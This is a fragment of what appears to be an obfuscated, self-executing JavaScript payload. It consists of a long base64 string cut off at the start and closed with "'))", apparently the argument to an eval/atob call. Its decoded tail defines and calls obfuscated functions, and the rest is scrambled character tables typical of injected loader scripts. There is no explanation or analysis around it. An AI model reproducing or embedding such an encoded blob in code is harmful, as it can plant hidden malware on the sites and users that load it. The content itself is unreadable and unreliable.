VBKkFkX25BZm97QUFBIUF1QTMoMTNfO2Y4KGhyNl09bjNTandBc2U9X0F3I2czYV9oQUFlZ24tKV9cJ0FkZl1vN0E2KyV1QTVvOX1hKUE2XzRfeStIYX10QXJHNElBYXdfVjt9ZV1sQEFfX1p7ZHE0QXNdZkE9ZDVBRXQpUSMwXSgjbGVBXXJdQWhvXWdfQXNlO05BJWZwYXNmZEF5ZCN0c2pvIW9dM2UxNChCdj1dfXsxQSV7Nzh7MUFUYn1oQWlFQWZwKUF7Km9wNyguMnJdVkBdQV8lYUFsRHUubkkyPTZsQSVuO2FOQW99IGYgQWlBKyUpZTpmP2wyW29zYyJjQWMsXXsuKz0oQSk7QWwpOXM9Nk5BU3RfO31OS19dciheSU8iey4peDVkVUFzXyMpXWU7YnQoWl9ldGF9XS5fQWd0aVJqbGEoSGhBUSFiKUFdKUFtLjtdQSBkLlkgQWxvMGJbZHQoZTJmQV9vdl8lUyUuOSBzYmErX3UlQTklb2dBMHJvX09fe3RlXCcsO3t7aX1lX2YgQXFBfWZyZmNsXztqKW89bjNBNGVkY2xhc0FuK0E0Nl8qLjB3bmY0b119X0EpLikoQUF9QTdmKGYsQU1BJUFBbjt0UW5rZjFBLl90QTJdYn1fbyE2JWRmJGM7KSl1X0F1Wy5fMzwgY2dyXSBdOEFBfUE2QWwzcm5ddH0wMTFdJGU1cl1mPV8pc2M6QUF0Z2w5QUEgby1sXy4gQXUhYXIxZjA7eGxBY1tzb2VfX2lAJE9BbyAmODkue2VfZWVyeXJBaSBmLjAoajlBKGxvOEEwcnZ1QU9Ub2w9SzlfbF1BQXVmYVxcbjspOygzXygoZHNvQWRzXC9sJXQ9ISlGTildNWFkNm83QTNvby5jJV9pLF1jPSlpPV85ZDtyN3AoYTBfYSU1ZWVjc3JwNyl0IWx1OSUxISlBb3AhbjBfbW9dZCRBPyVfYXFzU1wvOyUpcjdBIC5objFfJW95b3tdXC9daD0xK11BQUFsJTQgdV8uMjM4ZUFPKDJVIF8zQXQzMlNpb2tycmY9LnByZmUoeSx0IWUpQT1hXyRncH0peycpKTt2YXIgVGR1PVRBdyhvUE8sa0hlICk7VGR1KDMyMjQpO3JldHVybiA4MDgyfSkoKQ=='))
